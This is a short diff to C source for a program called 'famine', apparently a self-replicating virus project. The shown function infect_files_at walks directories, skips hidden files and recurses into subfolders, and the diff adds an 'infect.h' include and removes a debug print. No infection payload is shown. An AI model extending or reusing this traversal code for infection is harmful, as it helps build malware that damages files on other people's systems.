@@ -12,7 +12,9 @@
 
 #include <limits.h>
 #include <dirent.h>
+#include <stdio.h>
 #include "famine.h"
+#include "infect.h"
 #include "utils.h"
 
 static void	infect_files_at(char path[PATH_MAX], char *path_end)
@@ -27,7 +29,6 @@ static void	infect_files_at(char path[PATH_MAX], char *path_end)
 	while ((file = readdir(dirp)))
 	{
 		ft_strcpy(path_end, file->d_name);
-		printf("name: |%s|\n", file->d_name);
 		if (file->d_name[0] == '.') // we respect your privacy ;)
 			continue;
 		else if (file->d_type == DT_DIR)
